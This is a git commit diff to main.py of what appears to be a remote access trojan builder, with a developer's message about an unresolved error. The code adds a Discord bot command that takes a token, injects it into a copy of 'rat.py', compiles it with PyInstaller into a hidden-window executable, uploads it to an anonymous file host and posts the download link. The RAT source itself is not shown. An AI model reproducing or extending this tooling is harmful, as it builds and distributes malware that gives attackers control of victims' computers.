bebdcd6491e42525bf8788bfc35ddd0f9e9ce69e
ryane-joe <125251551+ryane-joe@users.noreply.github.com>
2023-04-02 02:56:28 +0530

    bot created, takes tkn as input, runs gen(). error
    The bot therectically now works and the gen() function works too, however i continue to run into an error idk what to do w

--- main.py
+++ main.py
@@ -3,12 +3,14 @@ import shutil
 from pathlib2 import Path
 import PyInstaller
 import os
-#TODO dc config
+import discord
+from discord.ext import commands
+import time
+from time import sleep
 def upload(filepath):
     file_up = AnonFile()
     up = file_up.upload(filepath)
     return str(up.url.geturl())
-#TODO  try running this on a vm to fix the OSerror to try debug
 def gen(token):
     src = r'rat.py'
     dest = 'hi.py'
@@ -20,6 +22,13 @@ def gen(token):
     file.write_text(data)
     os.system("python -m PyInstaller --onefile --windowed --hidden-import=discord hi.py")
     print(upload(r'dist/hi.exe'))
-    
-gen('tkn')
+    return upload(r'dist/hi.exe')
+bot = commands.Bot(command_prefix="#",intents=discord.Intents.all())
 
+@bot.command(name="gen")
+async def generate_token(ctx, tkn: str):
+    x = gen(tkn)
+    await ctx.send(x)
+
+if __name__ == "__main__":
+    bot.run("tkn")
